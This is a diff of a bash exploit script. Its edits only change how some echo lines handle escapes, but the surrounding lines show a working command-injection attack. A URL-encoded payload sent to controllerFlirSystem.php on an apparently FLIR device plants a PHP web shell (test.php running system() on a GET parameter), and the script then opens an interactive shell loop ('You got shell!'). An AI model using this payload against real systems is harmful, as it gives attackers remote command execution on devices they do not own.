@@ -70,13 +70,13 @@ set -euo pipefail
 IFS=$'\n\t'
 
 if [ "$#" -ne 2 ]; then
-	echo -e "Usage: $0 ipaddr port\\n"
+	echo "Usage: $0 ipaddr port\\n"
 	exit 1
 fi
 
 ip=$1
 port=$2
-echo -e "\\nProbing target: http://$ip:$port\\n"
+echo "\\nProbing target: http://$ip:$port\\n"
 
 payload="dns%5Bdhcp%5D=%60echo+\"<?php+system(\\\\\$_GET['c']);?>\">test.php%60&dns%5Bserver1%5D=8.8.8.8&dns%5Bserver2%5D="
 htcode=$(curl -Is -G http://"$ip":"$port"/maintenance/controllerFlirSystem.php -d"$payload" 2>/dev/null | head -1 | awk -F" " '{print $2}')
@@ -90,7 +90,7 @@ else
 	exit 1
 fi
 
-echo -e "You got shell!\\nCtrl+C to exit.\\n"
+echo "You got shell!\\nCtrl+C to exit.\\n"
 
 while true; do
 	echo -ne "\\033[31m";
